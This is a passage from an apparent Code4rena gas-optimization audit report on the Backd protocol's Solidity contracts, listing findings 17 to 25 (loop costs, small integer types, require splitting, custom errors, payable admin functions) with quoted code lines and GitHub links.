{\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L135\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #3\r\n\r\n61         for (uint256 i = 0; i < ctokens.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L61\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n188         for (uint256 i = 0; i < protocols.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L188\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n456         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L456\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n479         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L479\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n506         for (uint256 i = 0; i < howMany; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L506\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #8\r\n\r\n891         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L891\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #9\r\n\r\n43             for (uint256 i = 0; i < users.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L43\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #10\r\n\r\n46                 for (uint256 j = 0; j < positions.length; j++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L46\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #11\r\n\r\n72         for (uint256 i = 0; i < keys.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L72\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #12\r\n\r\n93         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L93\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #13\r\n\r\n165         for (uint256 i = 0; i < length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L165\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #14\r\n\r\n117         for (uint256 i = 0; i < numActions; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L117\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #15\r\n\r\n260         for (uint256 i = 0; i < actions.length; i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L260\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #16\r\n\r\n313         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L313\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #17\r\n\r\n380         for (uint256 i = 0; i < _rewardTokens.length(); i++) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L380\r\n\r\n### 18. Splitting `require()` statements that use `&&` saves gas\r\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) for an example\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n359         require(\r\n360             newSwapperSlippage >= _MIN_SWAPPER_SLIPPAGE &&\r\n361                 newSwapperSlippage <= _MAX_SWAPPER_SLIPPAGE,\r\n362             Error.INVALID_AMOUNT\r\n363         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L359-L363\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n676         require(vars.success && abi.decode(vars.topupResult, (bool)), Error.TOP_UP_FAILED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L676\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #3\r\n\r\n273         require(\r\n274             token_ != address(_CVX) && token_ != address(underlying) && token_ != address(_CRV),\r\n275             Error.INVALID_TOKEN_TO_ADD\r\n276         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L273-L276\r\n\r\n### 19. Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\r\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\r\n\r\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\r\nUse a larger size then downcast where needed\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #1\r\n\r\n19     uint16 public constant BACKD_REFERRAL_CODE = 62314;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L19\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n127         uint128 totalTopUpAmount;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L127\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n206         uint128 depositAmount,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L206\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #4\r\n\r\n43     int128 private constant _CRV_INDEX = 0;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L43\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #5\r\n\r\n44     int128 private constant _CVX_CRV_INDEX = 1;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L44\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #6\r\n\r\n13     uint8 private _decimals;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L13\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #7\r\n\r\n31         uint8 decimals_,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L31\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #8\r\n\r\n74     function decimals() public view virtual override returns (uint8) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L74\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol   #9\r\n\r\n61         uint8 decimals = AggregatorV2V3Interface(feed).decimals();\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol#L61\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #10\r\n\r\n11             uint80 roundId,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L11\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #11\r\n\r\n15             uint80 answeredInRound\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L15\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #12\r\n\r\n18     function decimals() external view returns (uint8);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L18\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #13\r\n\r\n30     uint8 private immutable _decimals;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L30\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #14\r\n\r\n42             uint80 roundId,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L42\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #15\r\n\r\n46             uint80 answeredInRound\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L46\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #16\r\n\r\n50             uint80 roundId_,\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L50\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #17\r\n\r\n54             uint80 answeredInRound_\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L54\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #18\r\n\r\n59     function decimals() external view override returns (uint8) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L59\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #19\r\n\r\n37         uint64 timeToWait;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L37\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #20\r\n\r\n38         uint64 feeRatio;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L38\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #21\r\n\r\n39         uint64 lastActionTimestamp;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L39\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #22\r\n\r\n49         uint8 decimals;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L49\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #23\r\n\r\n296     function decimals() external view returns (uint8) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L296\r\n\r\n### 20. Using `private` rather than `public` for constants, saves gas\r\nIf needed, the value can be read from the verified contract source code\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #1\r\n\r\n19     uint16 public constant BACKD_REFERRAL_CODE = 62314;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L19\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #2\r\n\r\n21     uint256 public immutable curveHopIndex; // Underlying index in Curve Pool\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L21\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #3\r\n\r\n44     uint256 public constant MAX_PERFORMANCE_FEE = 0.5e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L44\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #4\r\n\r\n45     uint256 public constant MAX_DEVIATION_BOUND = 0.5e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L45\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #5\r\n\r\n46     uint256 public constant STRATEGY_DELAY = 5 days;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L46\r\n\r\n### 21. Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #1\r\n\r\n206         require(\r\n207             pendingUInts256[_TREASURY_FEE_FRACTION_KEY] +\r\n208                 pendingUInts256[_KEEPER_FEE_FRACTION_KEY] <=\r\n209                 ScaledMath.ONE,\r\n210             Error.INVALID_AMOUNT\r\n211         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L206-L211\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n553         require(position.threshold != 0, Error.NO_POSITION_EXISTS);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L553\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #3\r\n\r\n249         require(!meta.frozen, Error.ADDRESS_FROZEN);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L249\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #4\r\n\r\n69         require(\r\n70             msg.sender == account || addressProvider.isAction(msg.sender),\r\n71             Error.UNAUTHORIZED_ACCESS\r\n72         );\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L69-L72\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #5\r\n\r\n399         require(isCapped(), Error.NOT_CAPPED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L399\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #6\r\n\r\n224         require(controller.addressProvider().isAction(msg.sender), Error.UNAUTHORIZED_ACCESS);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L224\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #7\r\n\r\n215         require(communityReserve != address(0), \"Community reserve must be set\");\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L215\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #8\r\n\r\n139         require(token_ != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L139\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #9\r\n\r\n98         require(deadlines[key] != 0, Error.DEADLINE_NOT_ZERO);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L98\r\n\r\n### 22. `require()` or `revert()` statements that check input arguments should be at the top of the function\r\nChecks that involve constants should come before checks that involve state variables\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #1\r\n\r\n68         require(_keeperGauge != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L68\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #2\r\n\r\n33         require(_inflationManager != address(0), Error.INVALID_ARGUMENT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L33\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #3\r\n\r\n401         require(_depositCap > 0, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L401\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #4\r\n\r\n195         require(strategy_ != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L195\r\n\r\n### 23. Empty blocks should be removed\r\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n176     receive() external payable {\r\n177         // solhint-disable-previous-line no-empty-blocks\r\n178     }\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L176-L178\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #2\r\n\r\n10     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L10\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #3\r\n\r\n46     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L46\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #4\r\n\r\n45     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L45\r\n\r\n```solidity\r\nFile: contracts/vault/EthVault.sol   #5\r\n\r\n13     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L13\r\n\r\n### 24. Use custom errors rather than `revert()`/`require()` strings to save deployment gas\r\n\r\n```solidity\r\nFile: contracts/access/AuthorizationBase.sol (various lines)   #1\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/AuthorizationBase.sol\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol (various lines)   #2\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol (various lines)   #3\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol (various lines)   #4\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol (various lines)   #5\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol (various lines)   #6\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol (various lines)   #7\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol (various lines)   #8\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol\r\n\r\n```solidity\r\nFile: contracts/Controller.sol (various lines)   #9\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol (various lines)   #10\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol (various lines)   #11\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol (various lines)   #12\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol (various lines)   #13\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol\r\n\r\n```solidity\r\nFile: contracts/pool/Erc20Pool.sol (various lines)   #14\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/Erc20Pool.sol\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol (various lines)   #15\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol (various lines)   #16\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol (various lines)   #17\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol (various lines)   #18\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol (various lines)   #19\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol (various lines)   #20\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol (various lines)   #21\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol\r\n\r\n```solidity\r\nFile: contracts/utils/Pausable.sol (various lines)   #22\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Pausable.sol\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol (various lines)   #23\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol\r\n\r\n```solidity\r\nFile: contracts/vault/Erc20Vault.sol (various lines)   #24\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol\r\n\r\n```solidity\r\nFile: contracts/vault/VaultReserve.sol (various lines)   #25\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol (various lines)   #26\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol\r\n\r\n### 25. Functions guaranteed to revert when called by normal users can be marked `payable`\r\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #1\r\n\r\n35     function grantRole(bytes32 role, address account) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L35\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #2\r\n\r\n39     function addGovernor(address newGovernor) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L39\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #3\r\n\r\n43     function renounceGovernance() external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L43\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #4\r\n\r\n48     function addGaugeZap(address zap) external onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L48\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol   #5\r\n\r\n109     function revokeRole(bytes32 role, address account) public onlyGovernance {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L109\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #6\r\n\r\n61     function setInitialKeeperGaugeForToken(address lpToken, address _keeperGauge)\r\n62         external\r\n63         override\r\n64         onlyGovernance\r\n65         returns 